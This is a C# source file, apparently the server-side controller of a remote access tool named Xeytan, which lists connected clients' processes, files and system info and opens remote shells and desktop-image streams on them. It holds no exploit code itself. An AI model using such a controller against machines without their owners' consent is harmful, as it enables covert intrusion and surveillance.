using NetLib.Models;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using NetLib.Packets;
using XeytanCSharpServer.Models;
using XeytanCSharpServer.Net;
using XeytanCSharpServer.Ui.Console;
using FileInfo = NetLib.Models.FileInfo;

namespace XeytanCSharpServer
{
    class XeytanApplication
    {
        public NetServerService Server { get; set; }

        public ConsoleUiMediator UiMediator { get; set; }

        public void Run()
        {
            UiMediator = new ConsoleUiMediator
            {
                Application = this
            };

            Server = new NetServerService
            {
                Application = this
            };

            Server.StartAsync();

            UiMediator.Loop();
        }


        public Client GetClient(int clientId)
        {
            return Server.GetClientById(clientId);
        }

        public void FetchProcessList(Client client)
        {
            ThreadPool.QueueUserWorkItem((state => { Server.FetchProcessList(client); }));
        }

        public List<Client> GetClients()
        {
            return Server.GetClients();
        }

        public void FetchFileSystemDrives(Client client)
        {
            ThreadPool.QueueUserWorkItem((state => { Server.FetchFileSystemDrives(client); }));
        }

        public void FetchDirEntries(Client client, string basePath)
        {
            ThreadPool.QueueUserWorkItem((state => { Server.FetchDirEntries(client, basePath); }));
        }

        public void FetchSystemInfo(Client client)
        {
            ThreadPool.QueueUserWorkItem((state => { Server.FetchSystemInfo(client); }));
        }

        public void StartShell(Client client)
        {
            ThreadPool.QueueUserWorkItem(delegate(object state) { Server.StartShell(client); });
        }

        public void ExecInShell(Client client, string command)
        {
            ThreadPool.QueueUserWorkItem(delegate(object state) { Server.SendShellCommand(client, command); });
        }

        public void StartDesktop(Client client)
        {
            ThreadPool.QueueUserWorkItem(state => Server.StartDesktop(client));
        }

        public void StopDesktop(Client client)
        {
            ThreadPool.QueueUserWorkItem(state => Server.StopDesktop(client));
        }

        public void OnPresentationData(Client client)
        {
            UiMediator.ShowClientConnection(client);
        }

        public void OnFileSystemRoots(Client client, List<DiskDriveInfo> drives)
        {
            UiMediator.ShowFsRoots(client, drives);
        }

        public void OnFileSystemDirEntries(Client client, string basePath, List<FileInfo> dirEntries)
        {
            UiMediator.ShowFsDirEntries(client, basePath, dirEntries);
        }

        public void OnProcessListReceived(Client client, List<ProcessInfo> processes)
        {
            UiMediator.ShowProcessList(client, processes);
        }

        public void OnClientSystemInformation(Client client, SystemInfo systemInformation)
        {
            UiMediator.ShowSystemInformation(client, systemInformation);
        }

        public void OnShellResultReceived(Client client, ShellAction action, string data)
        {
            if (action == ShellAction.Push)
                UiMediator.ShowShellOutput(client, data);
            else if (action == ShellAction.Stop)
                UiMediator.StopShell(client);
        }

        public void OnDesktopImage(Client client, DesktopAction action, byte[] imageData)
        {
            if (action == DesktopAction.Push)
                UiMediator.OnDesktopImageReceived(client, imageData);
            else if (action == DesktopAction.Stop)
                UiMediator.OnDesktopStreamClosed(client);
        }
    }
}